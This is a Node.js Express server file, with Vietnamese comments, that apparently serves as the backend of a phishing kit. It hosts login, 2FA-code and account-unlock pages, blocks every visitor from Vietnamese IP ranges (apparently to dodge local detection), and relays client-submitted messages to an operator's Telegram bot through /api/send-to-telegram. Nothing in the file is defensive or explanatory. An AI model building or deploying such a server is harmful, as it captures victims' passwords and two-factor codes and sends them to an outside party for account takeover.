require('dotenv').config();
const express = require('express');
const axios = require('axios');
const path = require('path');
const fs = require('fs'); // Để đọc file IP
const ipRangeCheck = require('ip-range-check'); // Để kiểm tra IP trong dải CIDR

const app = express();
const PORT = process.env.PORT || 3000;

let vietnamIpRanges = []; // Biến lưu trữ các dải IP của VN

// --- Khởi tạo và tải danh sách IP Việt Nam khi server khởi động ---
async function loadVietnamIpRanges() {
    try {
        const data = fs.readFileSync(path.join(__dirname, 'vietnam_ips.json'), 'utf8');
        vietnamIpRanges = JSON.parse(data);
        console.log(`Loaded ${vietnamIpRanges.length} Vietnam IP ranges for blocking.`);
    } catch (error) {
        console.error('ERROR: Could not load vietnam_ips.json!', error.message);
        console.error('Please ensure "vietnam_ips.json" exists in the root directory and is a valid JSON array of CIDR strings.');
        console.error('Access will NOT be blocked by country if this file is missing or malformed.');
        // Trong môi trường production, bạn có thể muốn dừng server tại đây nếu việc chặn là bắt buộc
        // process.exit(1);
    }
}
loadVietnamIpRanges(); // Gọi hàm tải danh sách IP khi khởi động server
// --- Kết thúc tải danh sách IP ---

// Middleware để xử lý JSON body
app.use(express.json());

// --- Middleware chặn IP Việt Nam ---
// Middleware này phải đặt TRƯỚC express.static và các route khác để chặn sớm nhất có thể.
app.use((req, res, next) => {
    // Cho phép các yêu cầu từ localhost (127.0.0.1 hoặc ::1) để phát triển/kiểm thử
    if (req.ip === '::1' || req.ip === '127.0.0.1') {
        return next();
    }

    // Lấy địa chỉ IP của người dùng.
    // req.headers['x-forwarded-for'] quan trọng khi dùng proxy/load balancer (Nginx, Cloudflare)
    // Nó có thể chứa nhiều IP, ta lấy IP đầu tiên (IP gốc của client)
    const userIp = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0].trim() : req.ip;

    // Kiểm tra xem IP của người dùng có nằm trong bất kỳ dải IP Việt Nam nào không
    if (vietnamIpRanges.length > 0 && ipRangeCheck(userIp, vietnamIpRanges)) {
        console.warn(`BLOCKED: Access from Vietnam IP: ${userIp} for URL: ${req.originalUrl}`);
        // Trả về lỗi 403 Forbidden (Không được phép)
        return res.status(403).send('Access Denied: Your IP address is blocked from accessing this service.');
    }

    // Nếu không phải IP Việt Nam, cho phép yêu cầu tiếp tục
    next();
});
// --- Kết thúc Middleware chặn IP Việt Nam ---

// Phục vụ các file tĩnh từ thư mục 'public'
// Đặt sau middleware chặn IP để đảm bảo việc chặn diễn ra trước khi phục vụ file.
app.use(express.static(path.join(__dirname, 'public')));


// --- Định tuyến các URL thân thiện ---
// Trang chủ (index.html) -> /
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Trang đăng nhập (login_page.html) -> /login
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login_page.html'));
});

// Trang xác thực 2 yếu tố (2fa_page.html) -> /complete
app.get('/complete', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', '2fa_page.html'));
});

// Nếu bạn có các trang khác:
// app.get('/verification', (req, res) => {
//     res.sendFile(path.join(__dirname, 'public', 'verification.html'));
// });
// app.get('/unlock_step', (req, res) => {
//     res.sendFile(path.join(__dirname, 'public', 'unlock_steps.html'));
// });

// --- Telegram Proxy Endpoint ---
app.post('/api/send-to-telegram', async (req, res) => {
    try {
        const { message } = req.body;
        
        // Kiểm tra xem token và chat ID đã được cấu hình trong .env chưa
        if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
            console.error('Telegram bot token or chat ID is not configured in .env');
            return res.status(500).json({ success: false, error: 'Telegram API credentials missing.' });
        }

        const response = await axios.post(
            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: process.env.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML' // Đảm bảo tin nhắn được định dạng HTML
            }
        );
        
        res.json({ success: true, telegramResponse: response.data });
    } catch (error) {
        console.error('Telegram API Error:', error.response?.data?.description || error.message);
        res.status(500).json({ 
            success: false,
            error: 'Failed to send message to Telegram',
            details: error.response?.data || error.message
        });
    }
});

// --- Xử lý 404 Not Found ---
// Đặt route này cuối cùng để bắt tất cả các yêu cầu không khớp với bất kỳ route nào khác.
app.use((req, res) => {
    console.log(`404 Not Found for URL: ${req.originalUrl} from IP: ${req.ip}`);
    res.status(404).send('Page Not Found');
});

// --- Khởi động server ---
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Access points: http://localhost:${PORT}/, http://localhost:${PORT}/login, http://localhost:${PORT}/complete`);
});
